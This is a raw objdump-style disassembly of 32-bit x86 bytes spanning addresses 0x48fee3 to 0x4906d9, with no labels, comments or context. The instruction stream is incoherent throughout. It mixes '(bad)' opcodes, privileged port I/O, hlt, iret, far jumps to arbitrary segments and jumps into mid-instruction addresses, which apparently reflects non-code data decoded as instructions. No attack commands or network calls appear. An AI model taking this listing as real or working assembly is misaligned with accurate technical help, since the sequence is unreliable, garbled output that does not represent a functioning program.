  48fee3:	hlt    
  48fee4:	push   es
  48fee5:	dec    ebx
  48fee6:	push   cs
  48fee7:	mov    eax,ecx
  48fee9:	jno    0x48ff3d
  48feeb:	ret    0xfd9f
  48feee:	nop
  48feef:	sub    eax,0xffffff80
  48fef2:	push   esi
  48fef3:	mov    al,0xd9
  48fef5:	out    dx,al
  48fef6:	fucompp 
  48fef8:	mov    eax,0x14d60db3
  48fefd:	mov    bh,BYTE PTR [edx+0xc]
  48ff00:	aaa    
  48ff01:	loopne 0x48fe86
  48ff03:	scas   al,BYTE PTR es:[edi]
  48ff04:	or     DWORD PTR [ebx+0x8238783],ecx
  48ff0a:	enter  0x7d05,0x18
  48ff0e:	das    
  48ff0f:	add    BYTE PTR [ebp+esi*8+0x51],bl
  48ff13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ff14:	cmp    al,0xdf
  48ff16:	add    al,0x2
  48ff18:	fnstcw WORD PTR [esi+0x12]
  48ff1b:	int3   
  48ff1c:	cmp    BYTE PTR [esi],0x80
  48ff1f:	shr    DWORD PTR [edx],0x68
  48ff22:	cmp    bh,0xbd
  48ff25:	(bad)  
  48ff26:	call   DWORD PTR [esi-0x2e7eff68]
  48ff2c:	and    DWORD PTR [esi+0x62],ecx
  48ff2f:	(bad)  
  48ff30:	out    dx,eax
  48ff31:	shr    DWORD PTR [ebx+eax*4+0xe7c07fa],0x7f
  48ff39:	pop    es
  48ff3a:	std    
  48ff3b:	or     DWORD PTR [ebx-0x3],edi
  48ff3e:	cmp    eax,0x93406fff
  48ff43:	jbe    0x48ff9c
  48ff45:	mov    edx,eax
  48ff47:	rol    DWORD PTR ds:0x9dae0189,0x3a
  48ff4e:	sub    al,0x96
  48ff50:	leave  
  48ff51:	jnp    0x48ff5b
  48ff53:	shr    BYTE PTR [edi],1
  48ff55:	sbb    cl,bh
  48ff57:	das    
  48ff58:	mov    al,0xa6
  48ff5a:	pop    ebp
  48ff5b:	or     BYTE PTR [ebx],bh
  48ff5d:	ffreep st(7)
  48ff5f:	loop   0x48ff46
  48ff61:	outs   dx,DWORD PTR ds:[esi]
  48ff62:	and    BYTE PTR [edi],0x7b
  48ff65:	inc    edx
  48ff66:	jne    0x48ff74
  48ff68:	cmp    esi,edi
  48ff6a:	je     0x48ff4a
  48ff6c:	xchg   esi,eax
  48ff6d:	lock int 0x56
  48ff70:	clc    
  48ff71:	cmp    DWORD PTR [esi],edi
  48ff73:	pop    ss
  48ff74:	rol    BYTE PTR [esp+eax*8-0x33],cl
  48ff78:	jmp    0x4772:0x2710b9
  48ff7f:	sbb    cl,cl
  48ff81:	pop    ebp
  48ff82:	jmp    0x753b:0x4ad6dbb5
  48ff89:	and    BYTE PTR [ebp+0x68bafe6a],bl
  48ff8f:	xor    eax,0x2a0f7c7a
  48ff94:	sub    al,dh
  48ff96:	or     al,0xf7
  48ff98:	mov    eax,ds:0x8b21785a
  48ff9d:	jo     0x48ffaf
  48ff9f:	push   esi
  48ffa0:	push   ebx
  48ffa1:	sbb    al,dl
  48ffa3:	adc    al,0x39
  48ffa5:	mov    ah,0x43
  48ffa7:	test   BYTE PTR [edi],dl
  48ffa9:	adc    al,0xb
  48ffab:	push   0x40
  48ffad:	mov    DWORD PTR [ecx],edi
  48ffaf:	dec    esp
  48ffb0:	cmp    al,0xd
  48ffb2:	mov    eax,0x57698c00
  48ffb7:	or     edi,0x3
  48ffba:	cld    
  48ffbb:	mov    ds:0xb8d32e0,eax
  48ffc0:	(bad)  
  48ffc1:	jmp    0x490007
  48ffc3:	test   BYTE PTR [esi-0x5a],0x3
  48ffc7:	mov    esi,0x933880f6
  48ffcc:	push   esi
  48ffcd:	clc    
  48ffce:	push   cs
  48ffcf:	enter  0x7dbe,0x6f
  48ffd3:	or     BYTE PTR [esi+ebx*1],cl
  48ffd6:	(bad)  
  48ffd7:	cli    
  48ffd8:	add    BYTE PTR [edx+eax*4-0x15],ch
  48ffdc:	fidivr WORD PTR [eax+0x15128807]
  48ffe2:	je     0x48ffef
  48ffe4:	push   eax
  48ffe5:	push   ebp
  48ffe6:	loope  0x490043
  48ffe8:	fwait
  48ffe9:	call   0x6c656671
  48ffee:	or     BYTE PTR [eax+eax*1],cl
  48fff1:	sbb    bl,BYTE PTR [ebp+0x1d]
  48fff4:	push   ds
  48fff5:	or     dl,dl
  48fff7:	sub    DWORD PTR [eax],0xffffffc0
  48fffa:	cmp    eax,0x2304a608
  48ffff:	into   
  490000:	test   esi,esi
  490002:	cmp    eax,0xf04203c4
  490007:	jle    0x48fffd
  490009:	inc    eax
  49000a:	je     0x490019
  49000c:	test   DWORD PTR [edi+0x59d804b5],esp
  490012:	mov    ds:0x39154b6d,al
  490017:	aad    0x4d
  490019:	pop    edx
  49001a:	lock mov al,ds:0xebae3a4f
  490020:	aam    0xf5
  490022:	out    dx,eax
  490023:	nop
  490024:	xor    edx,DWORD PTR [esi]
  490026:	iret   
  490027:	outs   dx,DWORD PTR ds:[esi]
  490028:	xchg   esi,eax
  490029:	mov    bl,0xc2
  49002b:	je     0x48ffbd
  49002d:	jno    0x48ffb7
  49002f:	cs js  0x48ffb7
  490032:	add    ebx,DWORD PTR [ebp+0x14c4cc32]
  490038:	adc    al,0xc8
  49003a:	nop
  49003b:	jg     0x490001
  49003d:	or     bh,al
  49003f:	jne    0x490059
  490041:	test   esi,esi
  490043:	je     0x490051
  490045:	test   eax,0x147056ad
  49004a:	jbe    0x49007a
  49004c:	sti    
  49004d:	jo     0x49005b
  49004f:	mov    ds:0x49c2f24e,al
  490054:	iret   
  490055:	inc    eax
  490056:	shl    DWORD PTR [edi-0x4b],0x50
  49005a:	loop   0x4900a5
  49005c:	and    eax,0xf07d1408
  490061:	add    eax,esp
  490063:	xor    esp,DWORD PTR [edi]
  490065:	iret   
  490066:	hlt    
  490067:	hlt    
  490068:	fimul  DWORD PTR [ecx-0x72]
  49006b:	dec    ecx
  49006c:	jle    0x4900d7
  49006e:	inc    BYTE PTR [ebp+edi*1+0xf]
  490072:	mov    dl,dh
  490074:	cmp    edx,DWORD PTR [edx]
  490076:	pop    esp
  490077:	loopne 0x4900dc
  490079:	jmp    0x36ff:0x66bb870f
  490080:	jmp    FWORD PTR [eax]
  490082:	clc    
  490083:	jnp    0x49007d
  490085:	xchg   esi,eax
  490086:	fcom   st(0)
  490088:	mov    esi,0xf87d0117
  49008d:	sub    ebx,edi
  49008f:	in     al,dx
  490090:	sub    DWORD PTR [esi-0x4a],eax
  490093:	cli    
  490094:	jg     0x4900ef
  490096:	mov    eax,esp
  490098:	mov    al,0x3c
  49009a:	and    al,0x3b
  49009c:	pop    ebp
  49009d:	hlt    
  49009e:	jb     0x4900fc
  4900a0:	sbb    DWORD PTR [ebp-0xb0446e1],0xffffff82
  4900a7:	xchg   ebx,eax
  4900a8:	lods   al,BYTE PTR ds:[esi]
  4900a9:	sbb    al,0x3b
  4900ab:	fnstenv [esi+0x9]
  4900ae:	jle    0x490125
  4900b0:	hlt    
  4900b1:	or     BYTE PTR [eax-0xbcf68a8],bh
  4900b7:	sub    dh,ah
  4900b9:	xor    dl,al
  4900bb:	jmp    0x4900c8
  4900bd:	popa   
  4900be:	and    eax,0xc6f909cc
  4900c3:	push   es
  4900c4:	ret    
  4900c5:	cmp    ebx,DWORD PTR [eax+0x6cbb84d3]
  4900cb:	ja     0x490128
  4900cd:	push   eax
  4900ce:	mov    ah,0xed
  4900d0:	iret   
  4900d1:	enter  0xedb6,0x23
  4900d5:	sbb    al,0x1c
  4900d7:	jnp    0x49010b
  4900d9:	add    DWORD PTR fs:[ebp-0x2e],eax
  4900dd:	fsubr  DWORD PTR [ecx]
  4900df:	dec    esp
  4900e0:	jmp    0x490106
  4900e2:	jl     0x49014f
  4900e4:	and    ebp,esp
  4900e6:	inc    ebp
  4900e7:	enter  0x5fef,0x52
  4900eb:	adc    DWORD PTR [esi-0x3b4fe9de],0xffffffd6
  4900f2:	(bad)  
  4900f3:	cmp    al,0x88
  4900f5:	add    DWORD PTR [eax-0x57],ecx
  4900f8:	pop    esp
  4900f9:	bound  esp,QWORD PTR [eax+0x2638c444]
  4900ff:	adc    al,0x97
  490101:	xor    ebx,DWORD PTR [esi+esi*4]
  490104:	cmp    dh,al
  490106:	dec    esi
  490107:	fadd   QWORD PTR [edi-0x6f21988f]
  49010d:	popa   
  49010e:	popa   
  49010f:	xlat   BYTE PTR ds:[ebx]
  490110:	and    al,BYTE PTR [eax]
  490112:	dec    ebx
  490113:	cli    
  490114:	mov    ebp,0x85e944ab
  490119:	adc    BYTE PTR [edi+0x22],ch
  49011c:	adc    bl,ch
  49011e:	in     al,dx
  49011f:	mov    DWORD PTR [esi],esp
  490121:	or     al,0x79
  490123:	loop   0x49016d
  490125:	in     al,dx
  490126:	in     al,0x7c
  490128:	scas   al,BYTE PTR es:[edi]
  490129:	out    0x76,al
  49012b:	jp     0x49015c
  49012d:	or     BYTE PTR [esp+esi*2],dl
  490130:	sub    bl,BYTE PTR [eax]
  490132:	into   
  490133:	mov    ebx,0xa44aa60f
  490138:	not    BYTE PTR [esi-0x47]
  49013b:	mov    eax,ds:0x8944fc18
  490140:	dec    ecx
  490141:	sbb    BYTE PTR [edi-0x3b7c49c6],ah
  490147:	adc    al,0xeb
  490149:	js     0x490132
  49014b:	cmp    BYTE PTR [esi+esi*8],0x6d
  49014f:	xchg   ebx,eax
  490150:	dec    eax
  490151:	frstor [ecx+0x723cc553]
  490157:	jo     0x4901c7
  490159:	test   BYTE PTR cs:[ebp+0x3d],al
  49015d:	fiadd  WORD PTR [eax+ecx*1]
  490160:	test   edx,0xf7f802
  490166:	mov    cl,0x3c
  490168:	mov    eax,DWORD PTR [edx]
  49016a:	cmp    al,BYTE PTR [ecx]
  49016c:	jne    0x49019c
  49016e:	or     bh,BYTE PTR [ecx-0x1]
  490171:	fist   WORD PTR [esi+0x2a]
  490174:	cmp    ah,BYTE PTR [ecx+0x10]
  490177:	and    eax,0x1d74e40a
  49017c:	shr    eax,0x10
  49017f:	cmp    al,BYTE PTR [ecx+0x2]
  490182:	jne    0x49019d
  490184:	sub    BYTE PTR [ecx],dl
  490186:	cmp    ch,0xa6
  490189:	lods   al,BYTE PTR ds:[esi]
  49018a:	add    ebp,DWORD PTR [eax+0x3404c2e6]
  490190:	adc    al,0xe0
  490192:	xchg   ebx,eax
  490193:	fwait
  490194:	mov    esi,0x9c90c332
  490199:	ror    DWORD PTR ds:0xb203d87a,1
  49019f:	add    ebx,eax
  4901a1:	xchg   BYTE PTR [esi+0x6],al
  4901a4:	mov    ah,BYTE PTR [edx]
  4901a6:	loopne 0x4901bd
  4901a8:	add    esi,edx
  4901aa:	add    DWORD PTR [edi+eiz*8+0x4aeee972],ecx
  4901b1:	jnp    0x49021b
  4901b3:	fsubr  QWORD PTR [esi]
  4901b5:	add    ah,BYTE PTR [esi+eiz*2-0x3140cf75]
  4901bc:	daa    
  4901bd:	add    BYTE PTR [edi-0x1b],cl
  4901c0:	mov    ch,0xbd
  4901c3:	push   es
  4901c4:	nop
  4901c5:	mov    ds:0x39888198,eax
  4901ca:	dec    ebp
  4901cb:	dec    eax
  4901cc:	sub    DWORD PTR [ebx-0x53],ecx
  4901cf:	pop    edi
  4901d0:	jnp    0x4901fc
  4901d2:	mov    ch,0x52
  4901d4:	sahf   
  4901d5:	(bad)  
  4901d7:	aaa    
  4901d8:	mov    esi,ecx
  4901da:	ins    DWORD PTR es:[edi],dx
  4901db:	test   BYTE PTR [ecx+0x50],bl
  4901de:	rol    eax,cl
  4901e0:	popa   
  4901e1:	and    al,0xa4
  4901e3:	inc    eax
  4901e4:	frstor [esi]
  4901e6:	jecxz  0x4901f3
  4901e8:	data16 je 0x490207
  4901eb:	sti    
  4901ec:	and    edi,DWORD PTR [edi]
  4901ee:	ficom  DWORD PTR [esi+0x60]
  4901f1:	inc    DWORD PTR [ebp+0x6cc2e71d]
  4901f7:	clc    
  4901f8:	cmp    DWORD PTR [edi+0x4],ebx
  4901fb:	jge    0x490200
  4901fd:	mov    DWORD PTR [eax],ecx
  4901ff:	push   esp
  490200:	cmp    ch,BYTE PTR [edi]
  490202:	stos   BYTE PTR es:[edi],al
  490203:	push   cs
  490204:	push   esi
  490205:	(bad)  
  490207:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  490209:	or     eax,0x24a2ed3b
  49020e:	mov    ebx,?
  490210:	jno    0x490269
  490212:	or     al,0xde
  490214:	or     BYTE PTR [edx],cl
  490216:	add    bl,ch
  490218:	lahf   
  490219:	add    DWORD PTR [eax],ecx
  49021b:	sub    eax,DWORD PTR [edi+0x4]
  49021e:	jge    0x4901f9
  490220:	lods   al,BYTE PTR ds:[esi]
  490221:	mov    al,BYTE PTR [edx-0x17]
  490224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  490225:	dec    edi
  490226:	cli    
  490227:	fsubr  DWORD PTR [ebx]
  490229:	fnstenv [eax+0x3c6716f6]
  49022f:	mov    ds:0x62d6684a,eax
  490234:	adc    al,0x53
  490236:	fisttp WORD PTR [edi+edi*8+0x44f60121]
  49023d:	xor    al,BYTE PTR [eax+eax*4]
  490240:	xchg   esp,eax
  490241:	sar    DWORD PTR [ebx],1
  490243:	shl    BYTE PTR [ebx+0x10],1
  490246:	mov    bh,0x10
  490248:	shr    BYTE PTR [edi-0x32],0x80
  49024c:	cmp    cl,BYTE PTR [edx]
  49024e:	jne    0x490251
  490250:	inc    ebx
  490251:	sub    BYTE PTR [edx-0xb],dh
  490254:	mov    di,0x582e
  490258:	inc    esi
  490259:	iret   
  49025a:	aam    0xc3
  49025c:	cdq    
  49025d:	test   dl,dl
  49025f:	push   eax
  490260:	mov    ds:0xef78c15b,eax
  490265:	dec    edi
  490266:	daa    
  490267:	pushf  
  490268:	xor    BYTE PTR [edx],ch
  49026a:	loope  0x4902a1
  49026c:	sbb    DWORD PTR [esi],ecx
  49026e:	mov    ah,0xfb
  490270:	mov    edx,0x6e55458a
  490275:	repnz and DWORD PTR [ebp-0xc],edx
  490279:	shr    DWORD PTR [eax-0x75],cl
  49027c:	sar    ch,0x7e
  49027f:	or     DWORD PTR [ecx+eax*8],0x3
  490283:	ret    0xfbc1
  490286:	add    eax,0x9d1c8dd2
  49028b:	out    0x2b,eax
  49028d:	call   0x8c2d598b
  490292:	add    ebp,ebx
  490294:	xor    BYTE PTR [ecx-0x69],bh
  490297:	fwait
  490298:	call   0x753b:0x994c3021
  49029f:	adc    al,BYTE PTR [edi+0x8]
  4902a2:	mov    bh,0x5
  4902a4:	inc    DWORD PTR [eax]
  4902a6:	pop    eax
  4902a7:	add    ecx,eax
  4902a9:	jmp    0x4902b4
  4902ab:	cmp    BYTE PTR [eax],0x16
  4902ae:	add    edi,edi
  4902b0:	bound  eax,QWORD PTR [eax+0x3b]
  4902b3:	sar    DWORD PTR [edx+0x72ec00c7],0xf3
  4902ba:	not    edx
  4902bc:	and    ch,bl
  4902be:	inc    eax
  4902bf:	arpl   sp,di
  4902c1:	or     edi,esp
  4902c3:	adc    dh,dl
  4902c5:	imul   esp,DWORD PTR [ebx-0x15],0x352dc238
  4902cc:	ret    0x74a1
  4902cf:	ja     0x49032f
  4902d1:	xor    DWORD PTR [edx+0x8ce7576],esp
  4902d7:	out    dx,al
  4902d8:	test   ecx,0x7bb70bc6
  4902de:	cmp    edx,DWORD PTR [edi+eax*2]
  4902e1:	sbb    cl,dh
  4902e3:	jmp    0x4902e9
  4902e5:	je     0x49028c
  4902e7:	sbb    bl,dl
  4902e9:	test   ecx,ebx
  4902eb:	push   esi
  4902ec:	test   al,0xa
  4902ee:	hlt    
  4902ef:	add    ecx,DWORD PTR [ebx-0x2a]
  4902f2:	mov    al,BYTE PTR [edx]
  4902f4:	ja     0x4902be
  4902f6:	push   0x182b8ac0
  4902fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4902fc:	jo     0x490360
  4902fe:	sub    BYTE PTR [ecx+0x71],bl
  490301:	inc    eax
  490302:	push   cs
  490303:	inc    esp
  490304:	clc    
  490305:	ds dec edx
  490307:	pop    ecx
  490308:	or     DWORD PTR [eax+0x39],eax
  49030b:	xor    eax,0x13b1b9d1
  490310:	test   al,0x83
  490312:	in     al,0xb9
  490314:	and    al,0x20
  490316:	sar    BYTE PTR [ebx-0x1f7c9851],cl
  49031c:	out    dx,eax
  49031d:	lock loopne 0x4902f6
  490320:	cmc    
  490321:	mov    esi,0x560e752e
  490326:	test   eax,0x10c60cfc
  49032b:	add    BYTE PTR [ecx-0x61],bl
  49032e:	ja     0x490313
  490330:	jge    0x49032b
  490332:	ins    BYTE PTR es:[edi],dx
  490333:	pop    ecx
  490334:	adc    cl,BYTE PTR [eax]
  490336:	and    eax,0xfffffffc
  490339:	push   ss
  49033a:	test   al,0xe0
  49033c:	rcl    DWORD PTR [edx],0xf8
  49033f:	add    DWORD PTR [edx+edx*1-0x58],esi
  490343:	or     al,ch
  490345:	int3   
  490346:	jne    0x49034f
  490348:	and    ch,dl
  49034a:	popa   
  49034b:	dec    ecx
  49034c:	pusha  
  49034d:	add    al,0x41
  49034f:	clc    
  490350:	rol    BYTE PTR [esi+0x334ca315],1
  490356:	leave  
  490357:	sti    
  490358:	cmp    al,0x82
  49035a:	sbb    DWORD PTR [eax],ebp
  49035c:	test   al,0xc1
  49035e:	outs   dx,BYTE PTR ds:[esi]
  49035f:	adc    eax,0x43042088
  490364:	adc    ch,bl
  490366:	aas    
  490367:	pusha  
  490368:	mov    al,ds:0x9257daca
  49036d:	or     al,BYTE PTR [ebx+0x805dcfe]
  490373:	data16 fcmovb st,st(3)
  490376:	cmp    eax,0x56ff83ae
  49037b:	mov    DWORD PTR [eax+0x43],eax
  49037e:	retf   0x6b0b
  490381:	or     eax,0x3f410790
  490386:	adc    esp,DWORD PTR [ebx+0xb]
  490389:	push   ds
  49038a:	push   esi
  49038b:	in     al,dx
  49038c:	dec    edi
  49038d:	mov    BYTE PTR [eax+0x4c082791],0x7
  490394:	push   esi
  490395:	inc    ebx
  490396:	add    BYTE PTR [esi+ecx*1],ch
  490399:	inc    ebx
  49039a:	enter  0xa841,0x0
  49039e:	call   0x5a1993b1
  4903a3:	ror    DWORD PTR [ecx+0x53],0x1
  4903a7:	adc    BYTE PTR [eax-0x37e0c0bf],al
  4903ad:	adc    eax,0x3d210700
  4903b2:	sub    dl,dh
  4903b4:	mov    al,ds:0x41290800
  4903b9:	jbe    0x49041b
  4903bb:	and    cl,0x1c
  4903be:	or     BYTE PTR [ebp+0x7e],dh
  4903c1:	mov    ebx,0x2b022190
  4903c6:	dec    edx
  4903c7:	adc    BYTE PTR [esi+eax*1],ch
  4903ca:	rcr    BYTE PTR [ebx],0x21
  4903cd:	push   ds
  4903ce:	push   esi
  4903cf:	push   0x10151bb
  4903d4:	pusha  
  4903d5:	adc    BYTE PTR [eax],al
  4903d7:	cs push es
  4903d9:	dec    eax
  4903da:	shl    DWORD PTR [ebp+edx*4+0x2],0x18
  4903df:	add    al,bh
  4903e1:	push   ds
  4903e2:	mov    esp,0x32d1a641
  4903e7:	out    dx,al
  4903e8:	call   0x32e0:0x2237740
  4903ef:	pop    ds
  4903f0:	sub    eax,0xc78b02f5
  4903f5:	add    DWORD PTR [edi],edi
  4903f7:	adc    BYTE PTR [eax],al
  4903f9:	aaa    
  4903fa:	cdq    
  4903fb:	xor    eax,edx
  4903fd:	sub    eax,edx
  4903ff:	and    DWORD PTR [edx],eax
  490401:	or     al,0x14
  490403:	xchg   ebx,eax
  490404:	adc    BYTE PTR ds:0xd96b01f8,cl
  49040a:	inc    ebx
  49040b:	xchg   edx,eax
  49040c:	jle    0x490434
  49040e:	xor    BYTE PTR [ecx],bl
  490410:	cmp    esi,ebx
  490412:	or     BYTE PTR [eax+ebx*4],0x20
  490416:	aad    0x71
  490418:	das    
  490419:	cld    
  49041a:	ins    DWORD PTR es:[edi],dx
  49041b:	cmp    BYTE PTR [esi+ecx*2-0x18],dl
  49041f:	inc    eax
  490420:	add    BYTE PTR [edi],bh
  490422:	jbe    0x49042d
  490424:	aaa    
  490425:	mov    ds:0xeb650675,eax
  49042a:	add    eax,0x458d146a
  49042f:	adc    al,0x16
  490431:	add    edi,esp
  490433:	add    DWORD PTR [eax+0x1804eb10],ebx
  490439:	jo     0x490450
  49043b:	into   
  49043c:	repz je 0x490474
  49043f:	mov    BYTE PTR [ecx],cl
  490441:	lods   eax,DWORD PTR ds:[esi]
  490442:	or     al,0x45
  490444:	repz (bad) 
  490446:	mov    eax,0x461b1750
  49044b:	fimul  DWORD PTR [edx]
  49044d:	ret    
  49044e:	mov    eax,ds:0x5e147c1c
  490453:	mov    WORD PTR [edi],es
  490455:	or     eax,0xf5ffb6e
  49045a:	jmp    0x490462
  49045c:	cmp    eax,esi
  49045e:	jge    0x4904ce
  490460:	(bad)  
  490461:	mov    ds:0xde50ae33,eax
  490466:	inc    ebx
  490467:	xor    ecx,DWORD PTR [edx+0x3b]
  49046a:	mov    ds:0x941e4874,eax
  49046f:	cwde   
  490470:	xchg   ecx,eax
  490471:	push   ds
  490472:	aam    0x89
  490474:	mov    DWORD PTR [ecx],esi
  490476:	int3   
  490477:	add    al,0x4c
  490479:	mov    ds:0x24921a50,eax
  49047e:	jns    0x4904c8
  490480:	loopne 0x490431
  490482:	outs   dx,BYTE PTR ds:[esi]
  490483:	aad    0xf7
  490485:	in     eax,dx
  490486:	inc    ebp
  490487:	js     0x490493
  490489:	shl    DWORD PTR [eax],0x38
  49048c:	cmp    ecx,0x7c2a02d0
  490492:	jmp    0x66cb:0x425efe6a
  490499:	push   ebp
  49049a:	pushf  
  49049b:	pusha  
  49049c:	cld    
  49049d:	ret    0x8ba6
  4904a0:	add    al,0xdc
  4904a2:	pusha  
  4904a3:	aam    0xfe
  4904a5:	cli    
  4904a6:	and    edi,0x1f
  4904a9:	shl    edi,0x6
  4904ac:	sbb    al,0x7
  4904ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4904af:	pop    esp
  4904b0:	(bad)  
  4904b1:	je     0x4904b7
  4904b3:	(bad)  [edi-0x15]
  4904b6:	imul   ebx,DWORD PTR [esi-0x62],0xc0784220
  4904bd:	add    BYTE PTR [edi-0x31c16b4f],bh
  4904c3:	pop    edi
  4904c4:	add    al,0x86
  4904c6:	adc    eax,0xc404f80
  4904cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4904cc:	cmp    eax,0xd21aee1a
  4904d1:	pusha  
  4904d2:	pop    ebp
  4904d3:	pop    ss
  4904d4:	out    dx,al
  4904d5:	(bad)  
  4904d6:	push   DWORD PTR ds:0x1b5397d7
  4904dc:	jmp    0x72f0:0x3bbfffdf
  4904e3:	and    al,BYTE PTR [ecx+0x77f6b0fe]
  4904e9:	sbb    cl,BYTE PTR [ebx-0x3e6ad432]
  4904ef:	adc    dl,ch
  4904f1:	aaa    
  4904f2:	outs   dx,BYTE PTR ds:[esi]
  4904f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4904f4:	push   ecx
  4904f5:	daa    
  4904f6:	or     DWORD PTR [esi+0xc],0x2aeb5978
  4904fd:	shr    esp,0xb8
  490500:	ds (bad) 
  490502:	and    BYTE PTR [esi+0x26],dl
  490505:	and    al,0x22
  490507:	jmp    0x90a651b6
  49050c:	adc    BYTE PTR [edi*2-0x3faf41ea],dl
  490513:	cs jnp 0x490507
  490516:	pop    ecx
  490517:	mov    es,WORD PTR [ecx+0x18445f48]
  49051d:	sbb    al,0xa4
  49051f:	gs dec ebx
  490521:	add    BYTE PTR [ebp+0x63],ah
  490524:	repz arpl bp,dx
  490527:	fild   WORD PTR [esi]
  490529:	loop   0x49054a
  49052b:	cmp    eax,0x608118e1
  490530:	mov    esp,0xf49dff7f
  490535:	push   es
  490536:	es rcl BYTE PTR fs:[ecx-0x6d2c4268],1
  49053e:	fnstcw WORD PTR [edi+esi*2+0x28]
  490542:	bound  esp,QWORD PTR [ecx+edi*8-0x527c4ef8]
  490549:	loopne 0x49055e
  49054b:	addr16 dec ecx
  49054d:	pop    ebp
  49054e:	lock and DWORD PTR [edx],edi
  490551:	inc    ecx
  490552:	and    BYTE PTR [esi],al
  490554:	pushf  
  490555:	push   ss
  490556:	test   eax,0xeb33423f
  49055b:	out    0x46,al
  49055d:	and    al,0x57
  49055f:	dec    ebp
  490560:	and    eax,0x77dab758
  490565:	aaa    
  490566:	add    BYTE PTR [eax+0x5c741918],0x44
  49056d:	cmp    BYTE PTR ds:0x419e3db0,dh
  490573:	cmp    esp,ebp
  490575:	ja     0x490580
  490577:	inc    ecx
  490578:	jmp    0x490551
  49057a:	fmul   QWORD PTR [ecx]
  49057c:	loop   0x490587
  49057e:	adc    al,cl
  490580:	mov    dh,0x22
  490582:	ja     0x490549
  490584:	mov    BYTE PTR [edi+0x485233fd],bl
  49058a:	je     0x49059a
  49058c:	push   0x2d
  49058e:	pop    ecx
  49058f:	int3   
  490590:	push   esi
  490591:	inc    ebx
  490592:	lea    ecx,[esi-0x6c]
  490595:	pop    esp
  490596:	adc    BYTE PTR [ebx],ch
  490598:	pop    edx
  490599:	mov    edi,ecx
  49059b:	pop    eax
  49059c:	or     al,0x27
  49059e:	push   eax
  49059f:	jnp    0x490575
  4905a1:	inc    ebx
  4905a2:	inc    esi
  4905a3:	cmp    esp,esi
  4905a5:	jb     0x4905f7
  4905a7:	or     eax,0x299a06a9
  4905ac:	inc    edx
  4905ad:	push   es
  4905ae:	out    dx,eax
  4905af:	cwde   
  4905b0:	test   eax,0xf0f1be20
  4905b5:	inc    ebp
  4905b6:	sbb    BYTE PTR [ebx-0xd44d7e9],0x40
  4905bd:	inc    esp
  4905be:	jmp    0x6d3378bc
  4905c3:	leave  
  4905c4:	adc    eax,0xa36121c4
  4905c9:	adc    al,0xaa
  4905cb:	inc    ebx
  4905cc:	inc    ecx
  4905cd:	pop    esp
  4905ce:	adc    al,0xa9
  4905d0:	inc    ebp
  4905d1:	dec    ebx
  4905d2:	sbb    edx,edx
  4905d4:	inc    ecx
  4905d5:	push   es
  4905d6:	cmp    dl,BYTE PTR [ebx+eax*1]
  4905d9:	test   al,0x81
  4905db:	mov    al,0x41
  4905dd:	sbb    eax,0x3b04f434
  4905e2:	not    DWORD PTR [edi]
  4905e4:	add    BYTE PTR [ebx-0x1f],al
  4905e7:	push   edi
  4905e8:	push   esp
  4905e9:	push   ebx
  4905ea:	push   0x24
  4905ec:	push   ebx
  4905ed:	lahf   
  4905ee:	mov    al,ds:0x9c2583c6
  4905f3:	data16 fbstp TBYTE PTR [ebp+0x1f]
  4905f7:	adc    bh,BYTE PTR [eax-0x4f]
  4905fa:	adc    DWORD PTR [ebp-0x15],edx
  4905fd:	sub    BYTE PTR [eax-0xb38c4f5],dh
  490603:	push   0x19
  490605:	(bad)  
  490606:	jg     0x49060e
  490608:	jl     0x49061d
  49060a:	cmp    ecx,edi
  49060c:	jb     0x49061d
  49060e:	mov    esi,0x87f1b7c
  490613:	mov    al,ds:0x24859ad
  490618:	mov    ecx,0x4b5ba85d
  49061d:	(bad)  
  49061f:	daa    
  490620:	lock and dl,bl
  490623:	inc    ecx
  490624:	push   edx
  490625:	dec    ebx
  490626:	jae    0x490609
  490628:	mov    bl,0xe0
  49062a:	fisttp QWORD PTR [edx]
  49062c:	test   edi,ebx
  49062e:	mov    fs,WORD PTR [edx]
  490630:	hlt    
  490631:	mov    ecx,0x37972e5c
  490636:	int    0xfc
  490638:	fs mov ebx,0xc40afeff
  49063e:	mov    ah,0x3b
  490640:	test   ecx,ecx
  490642:	jl     0x4906ae
  490644:	mov    esp,0x3f480ff
  490649:	add    BYTE PTR [ebx+0x76c00581],bh
  49064f:	pusha  
  490650:	xchg   esp,eax
  490651:	cdq    
  490652:	sub    edi,DWORD PTR [esp+ebp*8]
  490655:	push   eax
  490656:	fst    QWORD PTR [ebx-0x35e42cba]
  49065c:	enter  0xd47d,0xc1
  490660:	rol    DWORD PTR [eax+0x17035b60],1
  490666:	(bad)  
  490667:	cmp    esp,ecx
  490669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49066a:	in     al,dx
  49066b:	mov    edx,0x567266a7
  490670:	sub    DWORD PTR [eax-0x27d37b6f],edx
  490676:	stos   DWORD PTR es:[edi],eax
  490677:	fcmovnu st,st(6)
  490679:	fstp   DWORD PTR [ecx+0x196d6629]
  49067f:	push   ebp
  490680:	lock push esi
  490682:	arpl   bp,cx
  490684:	pop    ecx
  490685:	inc    esp
  490686:	sbb    BYTE PTR [edx-0x3a117b40],0xd8
  49068d:	ja     0x490695
  49068f:	test   BYTE PTR [eax-0x75],0x53
  490693:	cmp    DWORD PTR [esp+eiz*4],edi
  490696:	je     0x4906c4
  490698:	popf   
  490699:	ins    BYTE PTR es:[edi],dx
  49069a:	test   BYTE PTR [ebp+esi*8-0x65ffde8c],0x65
  4906a2:	sbb    al,0x24
  4906a4:	mov    es,WORD PTR [ebp+0x4]
  4906a7:	push   es
  4906a8:	push   esp
  4906a9:	fstp   st(1)
  4906ab:	mov    bl,bh
  4906ad:	push   cs
  4906ae:	clc    
  4906af:	mov    ebx,edx
  4906b1:	sub    edi,ecx
  4906b3:	sbb    esi,DWORD PTR [edx+0x1a200feb]
  4906b9:	dec    edx
  4906ba:	test   al,0x22
  4906bc:	jmp    0x1b992742
  4906c1:	fisubr DWORD PTR [edx-0x4ebd17c4]
  4906c7:	add    DWORD PTR [ecx+0x5ce45cde],0xb
  4906ce:	fsub   DWORD PTR [esi]
  4906d0:	mov    ds:0xa63c56a2,al
  4906d5:	les    ebx,FWORD PTR [edx]
  4906d7:	sar    edi,cl
  4906d9:	aaa    
